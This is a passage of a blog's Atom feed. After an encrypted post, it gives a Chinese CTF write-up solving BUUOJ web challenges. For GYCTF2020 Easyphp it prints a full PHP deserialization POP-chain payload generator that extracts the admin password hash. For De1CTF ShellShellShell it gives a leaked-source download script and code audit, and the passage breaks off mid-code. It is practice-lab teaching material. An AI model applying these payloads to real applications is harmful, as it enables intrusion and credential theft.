data-hmacdigest="c9134ea72c60128701d2ce8f96f3776445ab3f63afa2070ce24f1aa8728c0830">69d9c72eaa9dc2ef5a7cca7638440efb410a752a87c7f0be4f48f7f81e4830d3772313dc771b019b249def7848b1cbda0879a12477a14fa29bb7a29dac44202d6a7b78d405229c2c68750236b5ad8d5ae76eeaf29995708acd785ec0229f04b053f937370c50a4a6d7a7a9b5b6fe108c31a584f7a20b075c9def1dbbadd858297e34fb886ede4e35bccfd43d7bfb34d0ba4932df1ca39a18a2eb710e879c10d266329d155f2cc63f81943230bc80fe0b041bf546e30d5fced70dfc469abe248298f42870000319a61d8fe1e8c5705cc46a1ff4e8bc535a887d8dc490b708c8fafbf1f3a2b0d3d7eec0e9e6d3d00bb1727ef2c4fe1550dd531c3bdeedae49582fd2251e6fd62d994ed617ca76a03f0cd372a1df3184e36dd525088115e22fc7f55c142b53c7940931f890f803f35604beda27e0e913b74586337d59cd4693389b900d98dee20e8cf4a93ad1536922ee5406016a3d71f94287d2dd59fac937903d1d1884f463d14b387a0615dbf085731d9554e3808cb9e553eb2ceaec0980e0b582be00c1d60334a4a6d79f8d90824e62afa2b6e89d82b64d3b3e82cad9062f7b168acce0d0ff3947905643bd8aaf21848d42822a9082f3853c7f8d5c4aa5e78223f0258791df970be6e9984acbe7d6b2fff2067686525a874ad97acb21724760b3fa79a3fbf2d5451278448dd2d1805f95aa81099c192b59772404147574167261fb42043c58a39e6e91b4718aad516d735aba1b3b2b8c9e15960a1de30f80876e7562f5aaa0ac1261cd201c31198988e7ca9faa10789c870f8089a551392354c926ddb52e6339797cff285a212c87629eb505c8ca0b73b1d23b9f3cfc5f45d4e8587e3a1f849c61ed7ab62c0cf44c6c6011cd4b06fd019cab3d04984c4908a2e13a66d1e9288fb3d7b08b2661cd5b07a3e21a2a8a75f8ba63cebb842d7b88c1d59fe5b601d888a542a8187508f5834e54dcf0488e000b92ca8babeac0635721039b1c2f48c086bf3b7c74e4d4a0517adaf0782dc89d4a510e42bc7558dded455d26c29c21436997ffc168b3346413f513d24ed2be30aad5a855c65b0d4a6bc8ca3343530c0017b6c71d8aa44552fed20f6424149d69912cd86f6fde4658afe03d9307d8251702a0021a0a5e6b1a4a24ee6c638038bad5c5aa61f2a88aefaab60f3b0fbc71edb0340e0589b87efefde282cd4ef75ff655403fec5dbe7388394dd32f88c24ddef89bdb95e84c5b1fa964b5cf5c4f3e7fdebea448137192bfbf154878c5831b66f3db60c867dd5e7bc7d81ede48700804b0957a45f3f11bb0ace970290767b49d4e73bc18dad472a15ad0ab53adfd88054a3330e983643c37a8bd48eac58ad0c76f6c1f02088d0030d69df2d079ef9bc5855bb76d63f8e2a414b87391a353e90c05f25f2e6b9d629d1eda897d389242fe0d6f2e1ac88b14fc74a4b1225c276d61d451143678fac8bbb0417e9bd70fe69ff688d5c0d7d347a6a0ebdf2d09a7746280987be52a6f44723eacb12a82fe32d1d5bc1dd61ab5d61e8990bc882fc02efdbda0d9a9525e8f317f5f66126178c959768cb0433a5dd9ba327ad318ba9e2a293854f18d31c71dc8046cec79b796e597584d6b84bff7a458d0c1236a2c151fadd2878dbc03bb521bc0610dd1a25653539d0f01cb040a0a64fdf205a754a551802e952823b59d1cb7299a576730039bc028a4f2a52d8434554986b1b60500167e8ad30f62c0f0188a5ba0c6e0004e642d582b7c7259e001ab3a6a2ea07f367a9497baa435669d9a471a4f29c1afc5576535bdf05e0cca9206e8f02be40674cc66bf6156375b58eaccfa64298df22fed605a8612f5ebc56f2531494af711e0b2c6ec65408314a5bd73e45dcff23bc7217104148400f568e5c110d12afd3d4ec2581710cd5bd18e7a4c64753a99a930e29e5c64fcff7928de65f61f49912c1ec1821e3d434feac2750cd0986865d8e55e18fe2dd56ee9ff4440551685f8123440b1aa3d51361be5df0579671d959cd486e4de9bbe380926e85c3f9eff57a6b66432c4ebd120b6a005998af97250f74ed654a1ce691a4885ff2bed60f17cea25cef71d7b129c4c75940066b0c5b03d0de8339ba4e7abeacf555dddc2d3d836136ef5cef9e83f8957b0ea76033d11c56d330f64615ef87606677397664362b36044696f1f6a2ea50b97ceee08d47b2c01e2930e5826f1186043bc756e0a342b0bde280d3b52e8f296dcb7081d0689d97bd2ba0310e4374252dd872bd01b91f647acaa21a632f679590e116860e618aa32a527e043a4ac24f670fde79e1a8bac4f857886f71b68df6b40c5835422413f886a7d31b508cfdbef022a02e16c40d0e47fed0d876c31fb479bb173888ab4eefed72e44c3accf15af90427e91c0f01d77f006a6e97f8768050e1d56a56d61fde23edbc47930405678c0f3a6c7897b349c99d2abf91d3efa556c5796795a362449528554b21364bd8c6b23c9bdb29751857015ffde4693be4597aa6fb1fa660d0d78ab2a330275aad380a15756b9700b18e8f3fad68bc3a84b7dd0ef8a742aab67971df225a14c1ba13b9bf1882d62ed242296c1b92e67fba930924e62a428dff843ac7aaac466d9e88d714b0439cd16002a5f1c2f3575e0b5dbadf7593c8faa250e82e385cf9c95f2d946d06b6be98e6b090080fce268d479ab087ab6b300bb2f8023b8bb9a17f2eae98d82478dd745f61dada042901de2b82008c55b5dab464cf3a8556e7f4586c58a5cb20a0989313588e9e8d901c778e7e3cab9ef6da3ec0f3af2d869eb884ed18193e071543650a4b3c539b41bb91b648fe9cd7eaeeb3515120908b56baa61a888eb91be8ad77ec90b7c0c43b95fe9fb85412dd04e16f3806e00c2add9040926d4c15e62b7135298b3bed96db37e40e073f80b96fe2c02b72d6d6efc169b3cdced4743f2fe2c5e8e1c9a8ecb584f11982412958a852038581a8ed045b311c9a2a391b0762b1f73dccb0414b5a080bb4c3548cfe6008103e43a3c661c29b01d6efb1a70a344c75522595d4e19e3af213d4b456eafbb37244a0ae10d93b6f19f6b5c66c175f15cbe750d0e35c8592dca8773b954992db316ad48727eab16f61a276666f735d8945f774d23e5e37d4414bbbdbf4f89a56cfcc4b666a1a501410d44aeb2cee82e675e2b9f1b05993264e7c041ea3e409f50ad9edf2e749f857df24274741407bce9729498228b5b7b022744da6575c49103553f6a347ad6190f6af0524907c702b924d14596d7e0aabfe0020b4df7f1e93ec465dbb019582ede72bc36d3f16de2b321541d32b6d2e6ba9d1f926cc5305ecfed76f0c9661ce934f0d02ec74379c36ab9fa4c3bb704c0c3a4f622d64661366baa7ae707df50404b1140213455d4f774bb6bb55fa6d39eadc30c61b2a7c6e98c6a81fca83fae33a6bcc1b0e971a1577e80df35b89407de685bc27faeccfe54dbbef07f36b7b6d2e1f97981d5baaa7a4daaef2f00d4995c4e0293bed5df7949c12b636284e57b49b2ac019cba371703782bff7097ef67458353ba30e9916fadcc121a614ca11555d2f1e800ee0f134bebe3b24f9ddc60b0dd132faf2e8c4e16b7d02ec50f7d1baae0cf429b9f42ede0b438ccd3b142601a2848908c22462959aee8c87bcc8968e5d8c856c2e2c728ee6fc01dcc0b82898443cfffc0ea315799c612626e6bc23f0ca3c448b0015eaaecd20bba5542b13cf70ec9c6f07ee2b6ad48431e69d8e5aa719e1dec3a471f3f545c16764bf114d6ae0a202c1cb81cdc6e6578aef0017c1ded5c627f76932acdb7d2c72b4fd8d9e35efe4f337c3450d1082459a5e20992853951fbd2d0c4fcb6e60573280d6622959676c3057f23e6e93b9bd990653c2ac2144f568bf69bef4f997553b09dbdd9a8cd2cace52d9b613e22616e2c695d1fb878de6776a8d6e09322761cd5bb51b582226dd07dd59cf33fa4962d8459ba02cb270835205a3ca9f16e6ef886e2d0ec865635e987a643561a8bcad07acf416035de934211ddbcdadfe28996bb18386930baeddb585ef659a809bdfda08166b934962ad9d29e4355bd855b12c2c8f72e43a7702899be5010da81da61338b8a77326965468488691ef5e45a68cf433878ecea5fd327c4d2fb53d70a26ad7b8cc3a51da875c0a3168c211b82c9da56384b0ff4399ca410644950e8e2267f570318ae46200e4e934b50a6744dd3d46e852785749d2960120d6e2dc8ed2593312e1de972fa9ba0cbf7b485e0d7a617b16fa20a510ca53eabf2d5472f38036e825f2be7f3b4abed3fe1b5281162fe69e02acf908fe2e0bcd0aa871f6acfecd202541d9f998548eca135632d3b2c9faf92926b017a431770c393da5f322c216965d060d743aa4c6321443f64d66c2556ca2c54fa0cdb665d21cf11bc59293482e3c638caa59d6e132f0ab86087566be1a8bcf8f2592841f954d7408b2bc2aadbcebc9efe49fa19d01a80be197988cad8356a7740639ba4c467e87edaa26083455e3a1072f885f817976ebcf8b688ddbba63022b5d257653b20a2b4b1c4bcf67f221d066d2f7c1c8300d9cb3536b4c57630d68097ce42ef000e923a3e8ac2e27685d77fdbbf49015879b1b6205926d6635fa94958ef7c46660de9383d76599a37805b936da1958e7e744e4013e37966b36b9fa2f0fb8c6f9c29566995be7bfa9d213f9f27d009e1fa0cd2d7a5031cfea852086789a334e2bec188005ca3393d5da3139283d9559f021a9309660180c20ccd8ccf66ff6d7edcf8178cc9d7b98169645e689689608f4d948d8ad25b962dfe304c9ed4e7f6dc794be7393d4a93f2897cf3ce7167a40ae645cd913307c63b795cbaa1aa9dc71bd09840441428ef95839e8c84963db6406a1ec7d3351412500f8a79063b39ed36622fff29574cd29ec104a6ae4816b01d1198face08324ea083f36d506ae5a1eb86004d7b38444105e0e0657acbccea8214292683887a03a689b0275b7ace8bfd890a06e763659d31d3f06f453a81b962ad33e58a2802c1efd49d5a2e3e89335dc41b7a972fc57338eb3f12314f1ebd171f1729592a9ee846864d311dd58b7bbafc570cfbb6cf2530e627ab0efaac3b36beeebca316c893a7f3fa29baac16f87dbbd282dfc39f9e6f511df1bbd7a24262c6b7f97e361cec880592177f8890622907b74504771568f4013ea7f774c2f9d7c88f1d663e5d3d686bf662542a827ec1d2e3b48d0776d1ef1c4c506b509d68becc50d415009b3ff917a6509e656983cad143256b99b39dbfdbfdc9e33ea6d54851cb5434a88d231c5a34fc3345cf0899ad182725e4a321ee17c0de7f30fcc8fef23bf308c6976b08d23440845a143adb0b315573d6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（三）</title>
    <link href="http://yoursite.com/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://yoursite.com/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-03-25T12:37:11.000Z</published>
    <updated>2020-04-03T03:11:18.292Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-GYCTF2020-Easyphp"><a href="#0x-01-GYCTF2020-Easyphp" class="headerlink" title="0x 01 [GYCTF2020]Easyphp"></a>0x 01 [GYCTF2020]Easyphp</h3><ol><li>下载<a href="http://www.zip分析源代码，在login.php中ban掉了一大堆关键字，伪协议读取源代码无法实现" target="_blank" rel="noopener">www.zip分析源代码，在login.php中ban掉了一大堆关键字，伪协议读取源代码无法实现</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>login()函数来自lib.php。update.php里实例化了一个User()类，并update()。如果$_SESSION[‘login’]===1就输出flag。</p><ol start="2"><li>本题重点就是lib.php了。User类的login()从POST获取username和password后执行查询，将返回结果赋值给SESSION，跳过分析update.php，里面出现了unserialize()函数，这里是本题的关键</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update()&#123;</span><br><span class="line">        $Info&#x3D;unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age&#x3D;$Info-&gt;age;</span><br><span class="line">        $nickname&#x3D;$Info-&gt;nickname;</span><br><span class="line">        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);</span><br><span class="line">        &#x2F;&#x2F;这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先反序列化getNewInfo()返回值，又调用了UpdateHelper()。getNewInfo()代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getNewInfo()&#123;</span><br><span class="line">        $age&#x3D;$_POST[&#39;age&#39;];</span><br><span class="line">        $nickname&#x3D;$_POST[&#39;nickname&#39;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从POST获取age和nickname，返回safe()处理后的Info()序列化结果。safe()简单的将一堆关键字替换成’hacker’，这里会造成反序列化字符逃逸。接下来分析info类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个__call的魔术方法，当我们调用一个不存在的方法时会调用CtrlCase-&gt;login()方法，这里我们发现只有dbCtrl类有login()方法还需要一个参数，跟进dbCtrl类有login()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#39;用户不存在!&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;</span><br><span class="line">            echo(&#39;密码错误！&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就可以控制查询语句，把admin账户的密码查出来。得到admin用户的SQL语句不难写<code>select password,username from user where username=?</code>，因为login()返回的是idResult，第一个结果。接下来是想办法触发info类的call方法，回过头看User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，但是我们发现存在__toString()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>nickname哪里来的？unserialize(getNewInfo())得到的，如果nickname是Info类，nickname-&gt;update就会触发Info的<code>__call()</code>方法。接着想办法触发<code>__tostring()</code>方法，我们发现UpdateHelper类的<code>__destruct()</code>方法，会<code>echo $this-&gt;sql</code>，当$sql = new User()时就会触发User类的<code>__toString()</code>魔术方法。接着是构造怎么触发</p><p>pop链的思路：利用UpdateHelper类<code>__destruct()</code>触发User类<code>__toString()</code>,利用Info类没有update()触发其<code>__call()</code>，把$this-&gt;CtrlCase实例化成dbCtrl对象，再调用dbCtrl类login()，通过控制查询语句，把admin账户的密码查出来。</p><p>完整payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age &#x3D; null;</span><br><span class="line">    public $nickname &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;nickname &#x3D; $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo &#x3D; unserialize($newInfo);</span><br><span class="line">        $upDate &#x3D; new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">    public $dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">    public $database &#x3D; &quot;test&quot;;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token &#x3D; &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new dbCtrl();</span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$info &#x3D; new Info(&#39;&#39;,&#39;1&#39;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper &#x3D; new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase &#x3D; $db;</span><br><span class="line">$user-&gt;nickname &#x3D; $info;</span><br><span class="line">$user-&gt;age &#x3D; &quot;select password,id from user where username&#x3D;?&quot;;</span><br><span class="line">$updatehelper-&gt;sql &#x3D; $user;</span><br><span class="line">&#x2F;&#x2F; echo serialize($updatehelper);</span><br><span class="line">$c &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($updatehelper) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($c);</span><br><span class="line">$c &#x3D; str_repeat(&#39;union&#39;, $length).$c;    &#x2F;&#x2F;一个union被替换成hacker后可以逃逸出一个字符，要是嫌弃union太多可以用’（替换后逃逸五个字符）加上union</span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在update.php内post提交age=&amp;nickname=加代码的输出结果，就会得到admin密码的md5值，cmd5解密后登录，得到flag。</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/weixin_43610673/article/details/104549353" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43610673/article/details/104549353</a></p><p><a href="https://tiaonmmn.github.io/2020/03/04/BUUOJ刷题-Web-GYCTF2020-Easyphp/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p></blockquote><h3 id="0x-02-De1CTF-2019-ShellShellShell"><a href="#0x-02-De1CTF-2019-ShellShellShell" class="headerlink" title="0x 02 [De1CTF 2019]ShellShellShell"></a>0x 02 [De1CTF 2019]ShellShellShell</h3><ul><li><p>考点</p><p>源码泄漏、反序列化、ssrf、代码审计</p></li><li><p>解题步骤</p></li></ul><ol><li>使用dirsearch发现题目存在源码泄露，编写脚本将题目代码保存到本地进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"># import requests</span><br><span class="line">import urllib</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;mkdir source&#39;)</span><br><span class="line">os.system(&#39;mkdir source&#x2F;views&#39;)</span><br><span class="line">file_list_first&#x3D;[&#39;index.php&#39;,&#39;config.php&#39;,&#39;user.php&#39;]</span><br><span class="line">file_list_second&#x3D;[&#39;views&#x2F;delete&#39;,&#39;views&#x2F;index&#39;,&#39;views&#x2F;login&#39;,&#39;views&#x2F;logout&#39;,&#39;views&#x2F;phpinfo&#39;,&#39;views&#x2F;profile&#39;,&#39;views&#x2F;publish&#39;,&#39;views&#x2F;register&#39;]</span><br><span class="line">part_url&#x3D;&#39;http:&#x2F;&#x2F;5c15c1df-00fd-4ce7-a354-a4e4855c42e4.node3.buuoj.cn&#x2F;&#39;</span><br><span class="line">for i in file_list_first:</span><br><span class="line">    url&#x3D;part_url+i+&#39;~&#39;</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i)</span><br><span class="line">for i in file_list_second:</span><br><span class="line">    url&#x3D;part_url+i</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i+&#39;.php&#39;)</span><br></pre></td></tr></table></figure><p>得到如图所示的目录结构</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326194620571.png" alt></p><ol start="2"><li>爆破出验证码之后登陆进去发现有几个功能</li></ol><p>/index.php?action=profile:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103030632.png" alt></p><p>/index.php?action=publish:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103059191.png" alt></p><p>发现可控的参数只有publish页面的signature和mood参数，看一下publish源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($C-&gt;is_admin&#x3D;&#x3D;0) &#123;</span><br><span class="line">    if (isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line">        $res &#x3D; @$C-&gt;publish();</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;ok&#39;);self.location&#x3D;&#39;index.php?action&#x3D;index&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;something error&#39;);self.location&#x3D;&#39;index.php?action&#x3D;publish&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>跟进Customer::publish()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function publish()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood &#x3D; addslashes(serialize(new Mood((int)$_POST[&#39;mood&#39;],get_ip())));</span><br><span class="line">                $db &#x3D; new Db();</span><br><span class="line">                @$ret &#x3D; $db-&gt;insert(array(&#39;userid&#39;,&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;),&#39;ctf_user_signature&#39;,array($this-&gt;userid,$this-&gt;username,$_POST[&#39;signature&#39;],$mood));</span><br><span class="line">                if($ret)</span><br><span class="line">                    return true;</span><br><span class="line">                else</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>接受POST请求的参数，这里$mood被转换为int类型所以只有$signature完全可控，跟进Db::insert()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function insert($columns,$table,$values)&#123;</span><br><span class="line"></span><br><span class="line">        $column &#x3D; $this-&gt;get_column($columns);</span><br><span class="line">        $value &#x3D; 